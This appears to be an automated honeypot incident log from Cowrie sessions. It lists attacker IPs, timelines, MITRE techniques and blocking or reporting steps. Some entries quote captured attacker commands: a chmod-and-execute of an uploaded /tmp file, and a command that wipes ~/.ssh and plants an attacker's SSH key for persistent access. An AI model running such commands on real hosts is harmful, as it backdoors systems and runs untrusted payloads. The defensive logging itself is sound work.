### 🔴 HIGH · IR-8d8f248f6714

| Field | Detail |
|---|---|
| **Source IP** | `125.227.156[.]55` |
| **First Seen** | 2026-07-15 09:51 |
| **Last Seen** | 2026-07-15 09:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/bTUUUHI2` |
| **Download Attempts** | e53619ba943f2780f1ec5022fecd0bf50c38789c5c56ab39b256b7331d014e03 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:51:24` | `cowrie.session.connect` |
| `2026-07-15 09:51:24` | `cowrie.client.version` |
| `2026-07-15 09:51:24` | `cowrie.client.kex` |
| `2026-07-15 09:51:25` | `cowrie.login.success` |
| `2026-07-15 09:51:26` | `cowrie.client.var` |
| `2026-07-15 09:51:26` | `cowrie.session.params` |
| `2026-07-15 09:51:26` | `cowrie.command.input` |
| `2026-07-15 09:51:27` | `cowrie.session.file_download` |
| `2026-07-15 09:51:27` | `cowrie.log.closed` |
| `2026-07-15 09:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.227.156[.]55` to AbuseIPDB if not already reported
- [ ] Block `125.227.156[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a87973d315

| Field | Detail |
|---|---|
| **Source IP** | `125.227.156[.]55` |
| **First Seen** | 2026-07-15 09:51 |
| **Last Seen** | 2026-07-15 09:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/bTUUUHI2` |
| **Download Attempts** | e53619ba943f2780f1ec5022fecd0bf50c38789c5c56ab39b256b7331d014e03 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:51:24` | `cowrie.session.connect` |
| `2026-07-15 09:51:24` | `cowrie.client.version` |
| `2026-07-15 09:51:24` | `cowrie.client.kex` |
| `2026-07-15 09:51:25` | `cowrie.login.success` |
| `2026-07-15 09:51:26` | `cowrie.client.var` |
| `2026-07-15 09:51:27` | `cowrie.session.params` |
| `2026-07-15 09:51:27` | `cowrie.command.input` |
| `2026-07-15 09:51:27` | `cowrie.session.file_download` |
| `2026-07-15 09:51:27` | `cowrie.log.closed` |
| `2026-07-15 09:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.227.156[.]55` to AbuseIPDB if not already reported
- [ ] Block `125.227.156[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c8f07f19d74

| Field | Detail |
|---|---|
| **Source IP** | `125.227.156[.]55` |
| **First Seen** | 2026-07-15 09:51 |
| **Last Seen** | 2026-07-15 09:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x bTUUUHI2 && bash -c ./bTUUUHI2, ./bTUUUHI2` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:51:27` | `cowrie.session.connect` |
| `2026-07-15 09:51:27` | `cowrie.client.version` |
| `2026-07-15 09:51:28` | `cowrie.client.kex` |
| `2026-07-15 09:51:29` | `cowrie.login.success` |
| `2026-07-15 09:51:29` | `cowrie.client.var` |
| `2026-07-15 09:51:30` | `cowrie.session.params` |
| `2026-07-15 09:51:30` | `cowrie.command.input` |
| `2026-07-15 09:51:30` | `cowrie.command.input` |
| `2026-07-15 09:51:30` | `cowrie.command.failed` |
| `2026-07-15 09:51:30` | `cowrie.log.closed` |
| `2026-07-15 09:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.227.156[.]55` to AbuseIPDB if not already reported
- [ ] Block `125.227.156[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f108ac441b9c

| Field | Detail |
|---|---|
| **Source IP** | `125.227.156[.]55` |
| **First Seen** | 2026-07-15 09:51 |
| **Last Seen** | 2026-07-15 09:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x bTUUUHI2 && bash -c ./bTUUUHI2, ./bTUUUHI2` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:51:28` | `cowrie.session.connect` |
| `2026-07-15 09:51:28` | `cowrie.client.version` |
| `2026-07-15 09:51:28` | `cowrie.client.kex` |
| `2026-07-15 09:51:29` | `cowrie.login.success` |
| `2026-07-15 09:51:30` | `cowrie.client.var` |
| `2026-07-15 09:51:31` | `cowrie.session.params` |
| `2026-07-15 09:51:31` | `cowrie.command.input` |
| `2026-07-15 09:51:31` | `cowrie.command.input` |
| `2026-07-15 09:51:31` | `cowrie.command.failed` |
| `2026-07-15 09:51:31` | `cowrie.log.closed` |
| `2026-07-15 09:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.227.156[.]55` to AbuseIPDB if not already reported
- [ ] Block `125.227.156[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b734a670b4

| Field | Detail |
|---|---|
| **Source IP** | `209.97.183[.]158` |
| **First Seen** | 2026-07-15 09:52 |
| **Last Seen** | 2026-07-15 09:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:52:54` | `cowrie.session.connect` |
| `2026-07-15 09:52:54` | `cowrie.client.version` |
| `2026-07-15 09:52:54` | `cowrie.client.kex` |
| `2026-07-15 09:52:54` | `cowrie.login.success` |
| `2026-07-15 09:52:55` | `cowrie.session.params` |
| `2026-07-15 09:52:55` | `cowrie.command.input` |
| `2026-07-15 09:52:55` | `cowrie.log.closed` |
| `2026-07-15 09:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.97.183[.]158` to AbuseIPDB if not already reported
- [ ] Block `209.97.183[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a5b6b7220a6

| Field | Detail |
|---|---|
| **Source IP** | `209.97.183[.]158` |
| **First Seen** | 2026-07-15 09:55 |
| **Last Seen** | 2026-07-15 09:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:55:34` | `cowrie.session.connect` |
| `2026-07-15 09:55:34` | `cowrie.client.version` |
| `2026-07-15 09:55:34` | `cowrie.client.kex` |
| `2026-07-15 09:55:34` | `cowrie.login.success` |
| `2026-07-15 09:55:35` | `cowrie.session.params` |
| `2026-07-15 09:55:35` | `cowrie.command.input` |
| `2026-07-15 09:55:35` | `cowrie.log.closed` |
| `2026-07-15 09:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.97.183[.]158` to AbuseIPDB if not already reported
- [ ] Block `209.97.183[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7758ece7eefc

| Field | Detail |
|---|---|
| **Source IP** | `43.153.206[.]227` |
| **First Seen** | 2026-07-15 09:56 |
| **Last Seen** | 2026-07-15 09:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:56:49` | `cowrie.session.connect` |
| `2026-07-15 09:56:49` | `cowrie.telnet.option` |
| `2026-07-15 09:56:49` | `cowrie.telnet.option` |
| `2026-07-15 09:57:50` | `cowrie.login.success` |
| `2026-07-15 09:57:51` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `43.153.206[.]227` to AbuseIPDB if not already reported
- [ ] Block `43.153.206[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48c91589db63

| Field | Detail |
|---|---|
| **Source IP** | `209.97.183[.]158` |
| **First Seen** | 2026-07-15 09:58 |
| **Last Seen** | 2026-07-15 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 09:58:05` | `cowrie.session.connect` |
| `2026-07-15 09:58:05` | `cowrie.client.version` |
| `2026-07-15 09:58:05` | `cowrie.client.kex` |
| `2026-07-15 09:58:06` | `cowrie.login.success` |
| `2026-07-15 09:58:06` | `cowrie.session.params` |
| `2026-07-15 09:58:06` | `cowrie.command.input` |
| `2026-07-15 09:58:06` | `cowrie.log.closed` |
| `2026-07-15 09:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.97.183[.]158` to AbuseIPDB if not already reported
- [ ] Block `209.97.183[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0be8dd2e343

| Field | Detail |
|---|---|
| **Source IP** | `209.97.183[.]158` |
| **First Seen** | 2026-07-15 10:00 |
| **Last Seen** | 2026-07-15 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:00:38` | `cowrie.session.connect` |
| `2026-07-15 10:00:38` | `cowrie.client.version` |
| `2026-07-15 10:00:38` | `cowrie.client.kex` |
| `2026-07-15 10:00:38` | `cowrie.login.success` |
| `2026-07-15 10:00:39` | `cowrie.session.params` |
| `2026-07-15 10:00:39` | `cowrie.command.input` |
| `2026-07-15 10:00:39` | `cowrie.log.closed` |
| `2026-07-15 10:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.97.183[.]158` to AbuseIPDB if not already reported
- [ ] Block `209.97.183[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-966d44843830

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 10:02 |
| **Last Seen** | 2026-07-15 10:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:02:44` | `cowrie.session.connect` |
| `2026-07-15 10:02:45` | `cowrie.client.version` |
| `2026-07-15 10:02:45` | `cowrie.client.kex` |
| `2026-07-15 10:02:47` | `cowrie.login.success` |
| `2026-07-15 10:02:48` | `cowrie.session.params` |
| `2026-07-15 10:02:48` | `cowrie.command.input` |
| `2026-07-15 10:02:48` | `cowrie.log.closed` |
| `2026-07-15 10:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03680b203edb

| Field | Detail |
|---|---|
| **Source IP** | `103.68.52[.]210` |
| **First Seen** | 2026-07-15 10:03 |
| **Last Seen** | 2026-07-15 10:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:03:15` | `cowrie.session.connect` |
| `2026-07-15 10:03:16` | `cowrie.client.version` |
| `2026-07-15 10:03:16` | `cowrie.client.kex` |
| `2026-07-15 10:03:19` | `cowrie.login.success` |
| `2026-07-15 10:03:19` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.52[.]210` to AbuseIPDB if not already reported
- [ ] Block `103.68.52[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d69d3e002ddb

| Field | Detail |
|---|---|
| **Source IP** | `14.23.77[.]27` |
| **First Seen** | 2026-07-15 10:03 |
| **Last Seen** | 2026-07-15 10:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:03:26` | `cowrie.session.connect` |
| `2026-07-15 10:03:26` | `cowrie.client.version` |
| `2026-07-15 10:03:26` | `cowrie.client.kex` |
| `2026-07-15 10:03:28` | `cowrie.login.success` |
| `2026-07-15 10:03:29` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.23.77[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.23.77[.]27` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33e7ca58f891

| Field | Detail |
|---|---|
| **Source IP** | `111.70.49[.]182` |
| **First Seen** | 2026-07-15 10:03 |
| **Last Seen** | 2026-07-15 10:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:03:49` | `cowrie.session.connect` |
| `2026-07-15 10:03:50` | `cowrie.client.version` |
| `2026-07-15 10:03:50` | `cowrie.client.kex` |
| `2026-07-15 10:03:52` | `cowrie.login.success` |
| `2026-07-15 10:03:53` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.49[.]182` to AbuseIPDB if not already reported
- [ ] Block `111.70.49[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70da56d3b14b

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-07-15 10:03 |
| **Last Seen** | 2026-07-15 10:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:03:59` | `cowrie.session.connect` |
| `2026-07-15 10:04:00` | `cowrie.client.version` |
| `2026-07-15 10:04:00` | `cowrie.client.kex` |
| `2026-07-15 10:04:00` | `cowrie.login.success` |
| `2026-07-15 10:04:01` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98ed1f4d58c2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 10:05 |
| **Last Seen** | 2026-07-15 10:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:05:17` | `cowrie.session.connect` |
| `2026-07-15 10:05:17` | `cowrie.client.version` |
| `2026-07-15 10:05:17` | `cowrie.client.kex` |
| `2026-07-15 10:05:18` | `cowrie.login.success` |
| `2026-07-15 10:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7948717a5cdc

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 10:05 |
| **Last Seen** | 2026-07-15 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:05:17` | `cowrie.session.connect` |
| `2026-07-15 10:05:17` | `cowrie.client.version` |
| `2026-07-15 10:05:17` | `cowrie.client.kex` |
| `2026-07-15 10:05:18` | `cowrie.login.success` |
| `2026-07-15 10:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-009e9ffc0639

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 10:05 |
| **Last Seen** | 2026-07-15 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:05:18` | `cowrie.session.connect` |
| `2026-07-15 10:05:18` | `cowrie.client.version` |
| `2026-07-15 10:05:19` | `cowrie.client.kex` |
| `2026-07-15 10:05:19` | `cowrie.login.success` |
| `2026-07-15 10:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-817b01e5a8bd

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 10:05 |
| **Last Seen** | 2026-07-15 10:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:05:19` | `cowrie.session.connect` |
| `2026-07-15 10:05:19` | `cowrie.client.version` |
| `2026-07-15 10:05:20` | `cowrie.client.kex` |
| `2026-07-15 10:05:20` | `cowrie.login.success` |
| `2026-07-15 10:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-250e144e606d

| Field | Detail |
|---|---|
| **Source IP** | `45.55.133[.]80` |
| **First Seen** | 2026-07-15 10:07 |
| **Last Seen** | 2026-07-15 10:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:07:00` | `cowrie.session.connect` |
| `2026-07-15 10:07:00` | `cowrie.client.version` |
| `2026-07-15 10:07:00` | `cowrie.client.kex` |
| `2026-07-15 10:07:01` | `cowrie.login.success` |
| `2026-07-15 10:07:02` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.55.133[.]80` to AbuseIPDB if not already reported
- [ ] Block `45.55.133[.]80` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe0bf5225aa6

| Field | Detail |
|---|---|
| **Source IP** | `180.248.52[.]247` |
| **First Seen** | 2026-07-15 10:07 |
| **Last Seen** | 2026-07-15 10:07 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:07:08` | `cowrie.session.connect` |
| `2026-07-15 10:07:10` | `cowrie.client.version` |
| `2026-07-15 10:07:10` | `cowrie.client.kex` |
| `2026-07-15 10:07:17` | `cowrie.login.success` |
| `2026-07-15 10:07:18` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.248.52[.]247` to AbuseIPDB if not already reported
- [ ] Block `180.248.52[.]247` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-642da92685d9

| Field | Detail |
|---|---|
| **Source IP** | `61.76.38[.]54` |
| **First Seen** | 2026-07-15 10:11 |
| **Last Seen** | 2026-07-15 10:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:11:02` | `cowrie.session.connect` |
| `2026-07-15 10:11:02` | `cowrie.client.version` |
| `2026-07-15 10:11:03` | `cowrie.client.kex` |
| `2026-07-15 10:11:03` | `cowrie.login.success` |
| `2026-07-15 10:11:04` | `cowrie.session.params` |
| `2026-07-15 10:11:04` | `cowrie.command.input` |
| `2026-07-15 10:11:04` | `cowrie.command.failed` |
| `2026-07-15 10:11:05` | `cowrie.log.closed` |
| `2026-07-15 10:11:06` | `cowrie.session.params` |
| `2026-07-15 10:11:06` | `cowrie.command.input` |
| `2026-07-15 10:11:06` | `cowrie.session.file_download` |
| `2026-07-15 10:11:06` | `cowrie.log.closed` |
| `2026-07-15 10:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.38[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.76.38[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-193196994a50

| Field | Detail |
|---|---|
| **Source IP** | `61.76.38[.]54` |
| **First Seen** | 2026-07-15 10:11 |
| **Last Seen** | 2026-07-15 10:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:11:06` | `cowrie.session.connect` |
| `2026-07-15 10:11:06` | `cowrie.client.version` |
| `2026-07-15 10:11:06` | `cowrie.client.kex` |
| `2026-07-15 10:11:07` | `cowrie.login.success` |
| `2026-07-15 10:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.38[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.76.38[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40cc6c331118

| Field | Detail |
|---|---|
| **Source IP** | `61.76.38[.]54` |
| **First Seen** | 2026-07-15 10:11 |
| **Last Seen** | 2026-07-15 10:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:11:07` | `cowrie.session.connect` |
| `2026-07-15 10:11:07` | `cowrie.client.version` |
| `2026-07-15 10:11:08` | `cowrie.client.kex` |
| `2026-07-15 10:11:08` | `cowrie.login.success` |
| `2026-07-15 10:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.38[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.76.38[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e989c0451706

| Field | Detail |
|---|---|
| **Source IP** | `220.180.249[.]165` |
| **First Seen** | 2026-07-15 10:29 |
| **Last Seen** | 2026-07-15 10:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:29:32` | `cowrie.session.connect` |
| `2026-07-15 10:29:33` | `cowrie.client.version` |
| `2026-07-15 10:29:33` | `cowrie.client.kex` |
| `2026-07-15 10:29:35` | `cowrie.login.success` |
| `2026-07-15 10:29:37` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `220.180.249[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39d79f0da71

| Field | Detail |
|---|---|
| **Source IP** | `222.76.248[.]54` |
| **First Seen** | 2026-07-15 10:32 |
| **Last Seen** | 2026-07-15 10:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:32:47` | `cowrie.session.connect` |
| `2026-07-15 10:32:47` | `cowrie.client.version` |
| `2026-07-15 10:32:47` | `cowrie.client.kex` |
| `2026-07-15 10:32:51` | `cowrie.login.success` |
| `2026-07-15 10:32:51` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.76.248[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.76.248[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
